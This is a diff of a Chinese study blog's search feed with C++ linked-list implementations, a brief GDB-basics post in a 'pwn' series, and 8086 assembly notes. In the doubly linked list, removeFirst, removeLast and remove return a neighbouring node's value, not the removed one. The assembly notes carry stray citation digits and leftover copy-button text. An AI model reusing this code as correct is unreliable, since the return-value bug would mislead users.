temp;</span><br><span class="line"></span><br><span class="line">        head-&gt;next = x;</span><br><span class="line">        x-&gt;prev = head;</span><br><span class="line">        <span class="comment">// head &lt;-&gt; x &lt;-&gt; temp</span></span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void add(<span class="keyword">int</span> index, E element) &#123;</span><br><span class="line">        checkPositionIndex(index);</span><br><span class="line">        <span class="keyword">if</span> (index == size) &#123;</span><br><span class="line">            addLast(element);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到 index 对应的 Node</span></span><br><span class="line">        Node* p = getNode(index);</span><br><span class="line">        Node* temp = p-&gt;prev;</span><br><span class="line">        <span class="comment">// temp &lt;-&gt; p</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新要插入的 Node</span></span><br><span class="line">        Node* x = <span class="keyword">new</span> Node(element);</span><br><span class="line"></span><br><span class="line">        p-&gt;prev = x;</span><br><span class="line">        temp-&gt;next = x;</span><br><span class="line"></span><br><span class="line">        x-&gt;prev = temp;</span><br><span class="line">        x-&gt;next = p;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// temp &lt;-&gt; x &lt;-&gt; p</span></span><br><span class="line"></span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 删 *****</span></span><br><span class="line"></span><br><span class="line">    E removeFirst() &#123;</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements to remove&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 虚拟节点的存在是我们不用考虑空指针的问题</span></span><br><span class="line">        Node* x = head-&gt;next;</span><br><span class="line">        Node* temp = x-&gt;next;</span><br><span class="line">        <span class="comment">// head &lt;-&gt; x &lt;-&gt; temp</span></span><br><span class="line">        head-&gt;next = temp;</span><br><span class="line">        temp-&gt;prev = head;</span><br><span class="line"></span><br><span class="line">        delete x;</span><br><span class="line">        <span class="comment">// head &lt;-&gt; temp</span></span><br><span class="line"></span><br><span class="line">        size--;</span><br><span class="line">        <span class="keyword">return</span> temp-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E removeLast() &#123;</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements to remove&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Node* x = tail-&gt;prev;</span><br><span class="line">        Node* temp = tail-&gt;prev-&gt;prev;</span><br><span class="line">        <span class="comment">// temp &lt;-&gt; x &lt;-&gt; tail</span></span><br><span class="line"></span><br><span class="line">        tail-&gt;prev = temp;</span><br><span class="line">        temp-&gt;next = tail;</span><br><span class="line"></span><br><span class="line">        delete x;</span><br><span class="line">        <span class="comment">// temp &lt;-&gt; tail</span></span><br><span class="line"></span><br><span class="line">        size--;</span><br><span class="line">        <span class="keyword">return</span> temp-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E remove(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        <span class="comment">// 找到 index 对应的 Node</span></span><br><span class="line">        Node* x = getNode(index);</span><br><span class="line">        Node* prev = x-&gt;prev;</span><br><span class="line">        Node* next = x-&gt;next;</span><br><span class="line">        <span class="comment">// prev &lt;-&gt; x &lt;-&gt; next</span></span><br><span class="line">        prev-&gt;next = next;</span><br><span class="line">        next-&gt;prev = prev;</span><br><span class="line"></span><br><span class="line">        delete x;</span><br><span class="line">        <span class="comment">// prev &lt;-&gt; next</span></span><br><span class="line"></span><br><span class="line">        size--;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> next-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 查 *****</span></span><br><span class="line"></span><br><span class="line">    E get(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        <span class="comment">// 找到 index 对应的 Node</span></span><br><span class="line">        Node* p = getNode(index);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> p-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E getFirst() &#123;</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements in the list&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> head-&gt;next-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E getLast() &#123;</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements in the list&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> tail-&gt;prev-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 改 *****</span></span><br><span class="line"></span><br><span class="line">    E set(<span class="keyword">int</span> index, E val) &#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        <span class="comment">// 找到 index 对应的 Node</span></span><br><span class="line">        Node* p = getNode(index);</span><br><span class="line"></span><br><span class="line">        E oldVal = p-&gt;val;</span><br><span class="line">        p-&gt;val = val;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> oldVal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 其他工具函数 *****</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> getSize() <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> isEmpty() <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node* getNode(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        Node* p = head-&gt;next;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 可以优化，通过 index 判断从 head 还是 tail 开始遍历</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> isElementIndex(<span class="keyword">int</span> index) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> index &gt;= <span class="number">0</span> &amp;&amp; index &lt; size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> isPositionIndex(<span class="keyword">int</span> index) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> index &gt;= <span class="number">0</span> &amp;&amp; index &lt;= size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 index 索引位置是否可以存在元素</span></span><br><span class="line">    void checkElementIndex(<span class="keyword">int</span> index) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isElementIndex(index))</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;Index: &quot;</span> + std::to_string(index) + <span class="string">&quot;, Size: &quot;</span> + std::to_string(size));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 index 索引位置是否可以添加元素</span></span><br><span class="line">    void checkPositionIndex(<span class="keyword">int</span> index) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isPositionIndex(index))</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;Index: &quot;</span> + std::to_string(index) + <span class="string">&quot;, Size: &quot;</span> + std::to_string(size));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    void display() &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;size = &quot;</span> &lt;&lt; size &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">for</span> (Node* p = head-&gt;next; p != tail; p = p-&gt;next) &#123;</span><br><span class="line">            std::cout &lt;&lt; p-&gt;val &lt;&lt; <span class="string">&quot; &lt;-&gt; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;null&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~MyLinkedList() &#123;</span><br><span class="line">        <span class="keyword">while</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            removeFirst();</span><br><span class="line">        &#125;</span><br><span class="line">        delete head;</span><br><span class="line">        delete tail;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main() &#123;</span><br><span class="line">    MyLinkedList&lt;<span class="keyword">int</span>&gt; list;</span><br><span class="line">    list.addLast(<span class="number">1</span>);</span><br><span class="line">    list.addLast(<span class="number">2</span>);</span><br><span class="line">    list.addLast(<span class="number">3</span>);</span><br><span class="line">    list.addFirst(<span class="number">0</span>);</span><br><span class="line">    list.add(<span class="number">2</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    list.display();</span><br><span class="line">    <span class="comment">// size = 5</span></span><br><span class="line">    <span class="comment">// 0 &lt;-&gt; 1 &lt;-&gt; 100 &lt;-&gt; 2 &lt;-&gt; 3 &lt;-&gt; null</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>单链表</p>
+<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stdexcept&gt;</span><br><span class="line"></span><br><span class="line">template &lt;typename E&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLinkedList2</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 节点结构</span></span><br><span class="line">    struct Node &#123;</span><br><span class="line">        E val;</span><br><span class="line">        Node* next;</span><br><span class="line"></span><br><span class="line">        Node(E value) : val(value), next(nullptr) &#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    Node* head;</span><br><span class="line">    <span class="comment">// 实际的尾部节点引用</span></span><br><span class="line">    Node* tail;</span><br><span class="line">    <span class="keyword">int</span> size_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyLinkedList2() &#123;</span><br><span class="line">        head = <span class="keyword">new</span> Node(E());</span><br><span class="line">        tail = head;</span><br><span class="line">        size_ = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void addFirst(E e) &#123;</span><br><span class="line">        Node* newNode = <span class="keyword">new</span> Node(e);</span><br><span class="line">        newNode-&gt;next = head-&gt;next;</span><br><span class="line">        head-&gt;next = newNode;</span><br><span class="line">        <span class="keyword">if</span> (size_ == <span class="number">0</span>) &#123;</span><br><span class="line">            tail = newNode;</span><br><span class="line">        &#125;</span><br><span class="line">        size_++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void addLast(E e) &#123;</span><br><span class="line">        Node* newNode = <span class="keyword">new</span> Node(e);</span><br><span class="line">        tail-&gt;next = newNode;</span><br><span class="line">        tail = newNode;</span><br><span class="line">        size_++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void add(<span class="keyword">int</span> index, E element) &#123;</span><br><span class="line">        checkPositionIndex(index);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (index == size_) &#123;</span><br><span class="line">            addLast(element);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Node* prev = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            prev = prev-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        Node* newNode = <span class="keyword">new</span> Node(element);</span><br><span class="line">        newNode-&gt;next = prev-&gt;next;</span><br><span class="line">        prev-&gt;next = newNode;</span><br><span class="line">        size_++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E removeFirst() &#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements to remove&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Node* first = head-&gt;next;</span><br><span class="line">        head-&gt;next = first-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (size_ == <span class="number">1</span>) &#123;</span><br><span class="line">            tail = head;</span><br><span class="line">        &#125;</span><br><span class="line">        size_--;</span><br><span class="line">        E val = first-&gt;val;</span><br><span class="line">        delete first;</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E removeLast() &#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements to remove&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Node* prev = head;</span><br><span class="line">        <span class="keyword">while</span> (prev-&gt;next != tail) &#123;</span><br><span class="line">            prev = prev-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        E val = tail-&gt;val;</span><br><span class="line">        delete tail;</span><br><span class="line">        prev-&gt;next = nullptr;</span><br><span class="line">        tail = prev;</span><br><span class="line">        size_--;</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E remove(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line"></span><br><span class="line">        Node* prev = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            prev = prev-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Node* nodeToRemove = prev-&gt;next;</span><br><span class="line">        prev-&gt;next = nodeToRemove-&gt;next;</span><br><span class="line">        <span class="comment">// 删除的是最后一个元素</span></span><br><span class="line">        <span class="keyword">if</span> (index == size_ - <span class="number">1</span>) &#123;</span><br><span class="line">            tail = prev;</span><br><span class="line">        &#125;</span><br><span class="line">        size_--;</span><br><span class="line">        E val = nodeToRemove-&gt;val;</span><br><span class="line">        delete nodeToRemove;</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 查 *****</span></span><br><span class="line"></span><br><span class="line">    E getFirst() &#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements in the list&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head-&gt;next-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E getLast() &#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements in the list&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> getNode(size_ - <span class="number">1</span>)-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E get(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        Node* p = getNode(index);</span><br><span class="line">        <span class="keyword">return</span> p-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 改 *****</span></span><br><span class="line"></span><br><span class="line">    E set(<span class="keyword">int</span> index, E element) &#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        Node* p = getNode(index);</span><br><span class="line"></span><br><span class="line">        E oldVal = p-&gt;val;</span><br><span class="line">        p-&gt;val = element;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> oldVal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 其他工具函数 *****</span></span><br><span class="line">    <span class="keyword">int</span> size() &#123;</span><br><span class="line">        <span class="keyword">return</span> size_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> isEmpty() &#123;</span><br><span class="line">        <span class="keyword">return</span> size_ == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">bool</span> isElementIndex(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        <span class="keyword">return</span> index &gt;= <span class="number">0</span> &amp;&amp; index &lt; size_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> isPositionIndex(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        <span class="keyword">return</span> index &gt;= <span class="number">0</span> &amp;&amp; index &lt;= size_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 index 索引位置是否可以存在元素</span></span><br><span class="line">    void checkElementIndex(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isElementIndex(index)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;Index: &quot;</span> + std::to_string(index) + <span class="string">&quot;, size_: &quot;</span> + std::to_string(size_));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 index 索引位置是否可以添加元素</span></span><br><span class="line">    void checkPositionIndex(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isPositionIndex(index)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;Index: &quot;</span> + std::to_string(index) + <span class="string">&quot;, size_: &quot;</span> + std::to_string(size_));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回 index 对应的 Node</span></span><br><span class="line">    <span class="comment">// 注意：请保证传入的 index 是合法的</span></span><br><span class="line">    Node* getNode(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        Node* p = head-&gt;next;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main() &#123;</span><br><span class="line">    MyLinkedList2&lt;<span class="keyword">int</span>&gt; list;</span><br><span class="line">    list.addFirst(<span class="number">1</span>);</span><br><span class="line">    list.addFirst(<span class="number">2</span>);</span><br><span class="line">    list.addLast(<span class="number">3</span>);</span><br><span class="line">    list.addLast(<span class="number">4</span>);</span><br><span class="line">    list.add(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; list.removeFirst() &lt;&lt; std::endl; <span class="comment">// 2</span></span><br><span class="line">    std::cout &lt;&lt; list.removeLast() &lt;&lt; std::endl; <span class="comment">// 4</span></span><br><span class="line">    std::cout &lt;&lt; list.remove(<span class="number">1</span>) &lt;&lt; std::endl; <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; list.getFirst() &lt;&lt; std::endl; <span class="comment">// 1</span></span><br><span class="line">    std::cout &lt;&lt; list.getLast() &lt;&lt; std::endl; <span class="comment">// 3</span></span><br><span class="line">    std::cout &lt;&lt; list.get(<span class="number">1</span>) &lt;&lt; std::endl; <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
   </entry>
   <entry>
@@ -105,12 +180,274 @@
 ]]></content>
   </entry>
   <entry>
+    <title>pwn之旅 （二）</title>
+    <url>/2024/11/16/pwn%E4%B9%8B%E6%97%85-%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="pwn之旅（二）"><a href="#pwn之旅（二）" class="headerlink" title="pwn之旅（二）"></a>pwn之旅（二）</h1><h2 id="一、初识GDB"><a href="#一、初识GDB" class="headerlink" title="一、初识GDB"></a>一、初识GDB</h2><p>1.设置断点 b（任意字母） *xxxxxxxx（地址）</p>
+<p> i b（对应字母）步入</p>
+<p>2.ni 单步</p>
+<p>3.i r 观察寄存器的值</p>
+<p>4.disassemble xxxxx（如$rip） 反编译</p>
+<p>5.j（xx）汇编指令</p>
+<p><img src="/pwn%E4%B9%8B%E6%97%85-%EF%BC%88%E4%BA%8C%EF%BC%89.assets/jcc.png" alt="jcc"></p>
+]]></content>
+  </entry>
+  <entry>
     <title></title>
-    <url>/2024/10/12/%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<span id="more"></span>
-
-<p>title: 测试<br>date: 2024-10-12 23:32:22<br>tags:text</p>
-<p>仅为测试使用</p>
+    <url>/2025/06/28/%E4%B8%80%E3%80%81%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h3 id="一、汇编语言基础"><a href="#一、汇编语言基础" class="headerlink" title="一、汇编语言基础"></a>一、<strong>汇编语言基础</strong></h3><ol>
+<li><strong>数制与编码</strong><ul>
+<li><strong>进制转换</strong>：二进制、十六进制与十进制互转（重点掌握8421BCD码）16<ul>
+<li>例：<code>1011B = 11D</code>，<code>AF17H = 44823D</code></li>
+</ul>
+</li>
+<li><strong>补码表示</strong>：负数补码&#x3D;反码+1（用于有符号数运算）3</li>
+<li><strong>ASCII码</strong>：<code>A=41H</code>，<code>回车=0DH</code>，<code>换行=0AH</code>36</li>
+</ul>
+</li>
+<li><strong>基本概念</strong><ul>
+<li>机器指令（二进制） vs 汇编指令（助记符） vs 伪指令（编译器指令）14</li>
+<li><strong>三大总线</strong>：地址总线（寻址）、数据总线（传输）、控制总线（操作信号）1</li>
+<li><strong>存储器类型</strong>：RAM（断电丢失） vs ROM（永久存储）1</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="二、8086-8088-CPU核心架构"><a href="#二、8086-8088-CPU核心架构" class="headerlink" title="二、8086&#x2F;8088 CPU核心架构"></a>二、<strong>8086&#x2F;8088 CPU核心架构</strong></h3><ol>
+<li><p><strong>寄存器组</strong></p>
+<ul>
+<li><strong>通用寄存器</strong>：<ul>
+<li><code>AX</code>（累加器），<code>BX</code>（基址），<code>CX</code>（计数），<code>DX</code>（数据）</li>
+<li><code>SI</code>（源变址），<code>DI</code>（目的变址），<code>BP</code>（基址指针），<code>SP</code>（堆栈指针）168</li>
+</ul>
+</li>
+<li><strong>段寄存器</strong>：<ul>
+<li><code>CS</code>（代码段），<code>DS</code>（数据段），<code>SS</code>（堆栈段），<code>ES</code>（附加段）6</li>
+</ul>
+</li>
+<li><strong>控制寄存器</strong>：<ul>
+<li><code>IP</code>（指令指针），<code>FLAGS</code>（标志寄存器）6</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>物理地址计算</strong></p>
+<ul>
+<li><strong>公式</strong>：<code>物理地址 = 段地址 × 16 + 偏移地址</code>16<ul>
+<li>例：<code>236FH:1000H → 246F0H</code></li>
+</ul>
+</li>
+<li><strong>段内最大范围</strong>：64KB（偏移地址16位）10</li>
+</ul>
+</li>
+<li><p><strong>标志寄存器（FLAGS）</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">标志位</th>
+<th align="left">含义</th>
+<th align="left">触发条件</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>ZF</code></td>
+<td align="left">零标志位</td>
+<td align="left">结果&#x3D;0时置1</td>
+<td></td>
+</tr>
+<tr>
+<td align="left"><code>CF</code></td>
+<td align="left">进位标志位</td>
+<td align="left">无符号数溢出时置1</td>
+<td></td>
+</tr>
+<tr>
+<td align="left"><code>SF</code></td>
+<td align="left">符号标志位</td>
+<td align="left">结果为负时置1</td>
+<td></td>
+</tr>
+<tr>
+<td align="left"><code>OF</code></td>
+<td align="left">溢出标志位</td>
+<td align="left">有符号数溢出时置1</td>
+<td></td>
+</tr>
+<tr>
+<td align="left"><code>PF</code></td>
+<td align="left">奇偶标志位</td>
+<td align="left">结果低8位中1的个数为偶数时置1</td>
+<td>18</td>
+</tr>
+</tbody></table>
+</li>
+</ol>
+<hr>
+<h3 id="三、汇编指令系统详解"><a href="#三、汇编指令系统详解" class="headerlink" title="三、汇编指令系统详解"></a>三、<strong>汇编指令系统详解</strong></h3><ol>
+<li><strong>数据传送指令</strong><ul>
+<li><code>MOV</code>：双操作数字长需一致，禁止内存间直接传送68</li>
+<li><code>XCHG</code>：交换数据（寄存器&#x2F;内存）</li>
+<li><code>PUSH/POP</code>：堆栈操作（<code>SS:SP</code>管理，高地址向低地址增长）6</li>
+</ul>
+</li>
+<li><strong>算术运算指令</strong><ul>
+<li><code>ADD/SUB</code>：影响<code>CF, ZF, SF, OF</code></li>
+<li><code>MUL/DIV</code>：<ul>
+<li>字节乘法：<code>AL × 源 → AX</code></li>
+<li>字除法：<code>DX:AX ÷ 源 → 商在AX，余数在DX</code>68</li>
+</ul>
+</li>
+<li><code>INC/DEC</code>：不影响<code>CF</code></li>
+</ul>
+</li>
+<li><strong>逻辑与移位指令</strong><ul>
+<li><code>AND/OR/XOR</code>：位操作（例：大小写转换 <code>AND AL, 11011111B</code>）</li>
+<li><code>SHL/SHR</code>：逻辑左移&#x2F;右移（左移1位&#x3D;×2，右移1位&#x3D;÷2）</li>
+<li><code>ROL/ROR</code>：循环移位8</li>
+</ul>
+</li>
+<li><strong>程序控制指令</strong><ul>
+<li><code>JMP</code>：无条件转移</li>
+<li>条件跳转：<ul>
+<li>无符号数：<code>JA</code>（大于），<code>JB</code>（小于）</li>
+<li>有符号数：<code>JG</code>（大于），<code>JL</code>（小于）</li>
+</ul>
+</li>
+<li><code>LOOP</code>：循环指令（<code>CX</code>作为计数器）68</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="四、寻址方式（必考）"><a href="#四、寻址方式（必考）" class="headerlink" title="四、寻址方式（必考）"></a>四、<strong>寻址方式（必考）</strong></h3><ol>
+<li><strong>7种寻址方式</strong><ul>
+<li>立即寻址：<code>MOV AX, 3064H</code></li>
+<li>寄存器寻址：<code>MOV BX, AX</code></li>
+<li>直接寻址：<code>MOV AX, [2000H]</code></li>
+<li>寄存器间接：<code>MOV AX, [BX]</code></li>
+<li>基址变址：<code>MOV AX, [BX+SI+2]</code>（有效地址&#x3D; <code>BX+SI+2</code>）410</li>
+<li><strong>重点</strong>：基址寄存器（<code>BX/BP</code>）与变址寄存器（<code>SI/DI</code>）的组合规则1</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="五、程序设计基础"><a href="#五、程序设计基础" class="headerlink" title="五、程序设计基础"></a>五、<strong>程序设计基础</strong></h3><ol>
+<li><p><strong>伪指令与程序结构</strong></p>
+<ul>
+<li><p>数据定义：<code>DB</code>（字节），<code>DW</code>（字），<code>DD</code>（双字）</p>
+<ul>
+<li>例：<code>BUF DW 10 DUP(0)</code> → 分配20字节6</li>
+</ul>
+</li>
+<li><p>段定义：</p>
+<p>assembly</p>
+<p>复制</p>
+<p>下载</p>
+<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">DATA <span class="meta">SEGMENT</span></span><br><span class="line">    VAR <span class="built_in">DB</span> <span class="number">25H</span></span><br><span class="line">DATA ENDS</span><br><span class="line">CODE <span class="meta">SEGMENT</span></span><br><span class="line">    <span class="meta">ASSUME</span> <span class="built_in">CS</span>:CODE, <span class="built_in">DS</span>:DATA</span><br><span class="line">    <span class="keyword">MOV</span> <span class="built_in">AX</span>, DATA</span><br><span class="line">    <span class="keyword">MOV</span> <span class="built_in">DS</span>, <span class="built_in">AX</span></span><br><span class="line">CODE ENDS</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>程序结束：<code>MOV AH, 4CH</code> + <code>INT 21H</code>67</p>
+</li>
+</ul>
+</li>
+<li><p><strong>流程控制结构</strong></p>
+<ul>
+<li><p><strong>分支</strong>：<code>CMP AX, BX</code> + <code>JGE LABEL</code>（有符号数比较）</p>
+</li>
+<li><p><strong>循环</strong>：</p>
+<p>assembly</p>
+<p>复制</p>
+<p>下载</p>
